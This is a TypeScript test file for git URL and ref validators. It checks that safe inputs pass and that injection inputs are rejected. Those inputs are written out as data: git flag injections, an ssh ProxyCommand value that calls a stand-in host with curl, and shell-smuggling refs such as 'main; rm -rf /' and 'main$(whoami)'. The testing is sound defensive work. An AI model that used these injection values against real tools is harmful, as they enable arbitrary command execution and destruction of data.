import { describe, test, expect } from "bun:test"
import { validateGitUrl, validateGitRef } from "./url-validator"

describe("validateGitUrl", () => {
  describe("accepts valid URLs", () => {
    test.each([
      "https://github.com/org/repo.git",
      "http://example.com/repo.git",
      "git@github.com:org/repo.git",
      "ssh://git@github.com/org/repo.git",
      "file:///absolute/path/to/repo",
    ])("accepts %s", (url) => {
      expect(() => validateGitUrl(url)).not.toThrow()
    })
  })

  describe("rejects flag-injection URLs", () => {
    test.each([
      "--template=/tmp/evil",
      "--upload-pack=evil",
      "--config=core.sshCommand=evil",
      "-c core.sshCommand=evil",
      "--exec=bash",
    ])("rejects %s", (url) => {
      expect(() => validateGitUrl(url)).toThrow(/must not start with.*'-'/)
    })
  })

  describe("rejects unsupported schemes", () => {
    test.each([
      "javascript:alert(1)",
      "data:text/plain,hello",
      "ftp://example.com/repo",
      "",
      "  ",
      "github.com/org/repo",
    ])("rejects %s", (url) => {
      expect(() => validateGitUrl(url)).toThrow()
    })
  })

  describe("rejects URLs with control characters", () => {
    test.each([
      "https://github.com/org/repo\n--extra-arg",
      "https://github.com/org/repo\0evil",
      "https://github.com/org/repo\revil",
      "https://github.com/org/repo\tevil",
    ])("rejects URL containing control chars: %j", (url) => {
      expect(() => validateGitUrl(url)).toThrow(/control character/)
    })
  })

  describe("rejects ssh:// flag injection via authority", () => {
    test.each([
      "ssh://-oProxyCommand=curl evil.com",
      "ssh://--upload-pack=evil",
      "ssh://-flag",
    ])("rejects %s", (url) => {
      expect(() => validateGitUrl(url)).toThrow()
    })
  })

  describe("rejects git@ hostname edge cases", () => {
    test.each([
      "git@-evil.com:repo",     // hostname starts with dash (fails regex)
      "git@host:-flag",         // path starts with dash
    ])("rejects %s", (url) => {
      expect(() => validateGitUrl(url)).toThrow()
    })
  })

  describe("rejects https:// authority injection", () => {
    test.each([
      "https://-evil.com/repo",
    ])("rejects %s", (url) => {
      expect(() => validateGitUrl(url)).toThrow()
    })
  })
})

describe("validateGitRef", () => {
  describe("accepts valid refs", () => {
    test.each([
      "main",
      "v1.2.3",
      "v1.2.3-rc.1",
      "release/2025-01",
      "feature/my-branch",
      "abc123def456",
      "refs/tags/v1.0.0",
      "refs/heads/main",
      "a",
    ])("accepts %s", (ref) => {
      expect(() => validateGitRef(ref)).not.toThrow()
    })
  })

  describe("rejects flag-injection refs", () => {
    test.each([
      "--force",
      "-f",
      "--detach",
      "-B main",
      "--exec=bash",
    ])("rejects %s", (ref) => {
      expect(() => validateGitRef(ref)).toThrow()
    })
  })

  describe("rejects refs with unsafe characters", () => {
    test.each([
      "main; rm -rf /",
      "main$(whoami)",
      "main`id`",
      "main\nrm",
      "main && ls",
      "main branch",
      "main\ttab",
      "main\0null",
      " ",                            // whitespace-only
    ])("rejects %s", (ref) => {
      expect(() => validateGitRef(ref)).toThrow()
    })
  })

  describe("rejects git revision operators and refspec syntax", () => {
    test.each([
      "..",                           // range operator
      "...",                          // range operator
      "main..feature",               // range operator in context
      "HEAD:path/to/file",           // object-path syntax (colon)
      "main^2",                      // revision parent (caret)
      "main~3",                      // revision ancestor (tilde)
      "HEAD@{1}",                    // reflog syntax (braces)
      "v1.0^{commit}",              // dereference syntax
    ])("rejects %s", (ref) => {
      expect(() => validateGitRef(ref)).toThrow()
    })
  })
})
